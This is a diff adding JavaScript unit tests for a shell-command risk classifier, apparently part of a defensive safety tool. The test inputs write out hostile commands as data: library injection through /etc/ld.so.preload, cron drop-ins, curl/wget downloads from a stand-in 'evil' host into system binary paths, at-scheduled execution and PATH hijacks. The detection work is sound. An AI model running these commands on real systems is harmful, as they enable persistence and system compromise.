@@ -371,6 +371,89 @@ describe('_denoiseCommand helper', () => {
   });
 });
 
+describe('classifyCommand v1.10.64 patterns', () => {
+  // 5 new patterns covering library injection, cron drop-in dirs,
+  // PATH-write downloads, at scheduling, and PATH hijacks.
+
+  it('write to /etc/ld.so.preload → critical (library injection)', () => {
+    const r = classifyCommand('echo /tmp/evil.so > /etc/ld.so.preload');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'ld-preload-write'));
+  });
+
+  it('write to /etc/ld.so.conf.d also caught', () => {
+    const r = classifyCommand('echo "/tmp/lib" > /etc/ld.so.conf.d/evil.conf');
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it('write to /etc/cron.d/* → critical', () => {
+    const r = classifyCommand('echo "* * * * * root cmd" > /etc/cron.d/evil');
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it('write to cron.{daily,hourly,weekly,monthly} → critical', () => {
+    for (const dir of ['daily', 'hourly', 'weekly', 'monthly']) {
+      const r = classifyCommand(`echo evil > /etc/cron.${dir}/cmd`);
+      assert.strictEqual(r.level, 'critical', `${dir} should be critical`);
+    }
+  });
+
+  it('curl/wget downloading into a system PATH dir → high', () => {
+    for (const cmd of [
+      'curl -sL https://evil/x.sh -o /usr/local/bin/something',
+      'wget https://evil/x -O /usr/bin/sh',
+      'curl https://x.com -o /sbin/init',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+    }
+  });
+
+  it('curl downloading into /tmp does NOT trigger PATH-write', () => {
+    const r = classifyCommand('curl https://x.com -o /tmp/script.sh');
+    assert.ok(!r.reasons.some((x) => x.code === 'download-into-path'));
+  });
+
+  it('at scheduling → medium (delayed execution)', () => {
+    for (const cmd of [
+      'at midnight',
+      'at -f script.sh now + 1 minute',
+      'at noon tomorrow',
+      'at teatime',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'medium', `${cmd} should be medium`);
+      assert.ok(r.reasons.some((x) => x.code === 'at-schedule'));
+    }
+  });
+
+  it('PATH hijack via writable dir → medium', () => {
+    for (const cmd of [
+      'export PATH=/tmp:$PATH',
+      'export PATH=/var/tmp:$PATH',
+      'export PATH=$HOME/.cache:$PATH',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'medium', `${cmd} should be medium`);
+    }
+  });
+
+  it('regular PATH update (~/bin) does NOT trigger', () => {
+    const r = classifyCommand('export PATH=$HOME/bin:$PATH');
+    assert.ok(!r.reasons.some((x) => x.code === 'path-hijack'));
+  });
+
+  it('"cat" / "data" / "what" do NOT collide with at-schedule', () => {
+    // \bat boundary should anchor; words containing "at" must not
+    // trigger.
+    for (const cmd of ['cat README.md', 'echo data now', 'date now']) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'at-schedule'),
+        `${cmd} should not match at-schedule`);
+    }
+  });
+});
+
 describe('classifyCommand v1.10.62 patterns', () => {
   // Three new patterns + a terminator extension on rm-rf-root.
 
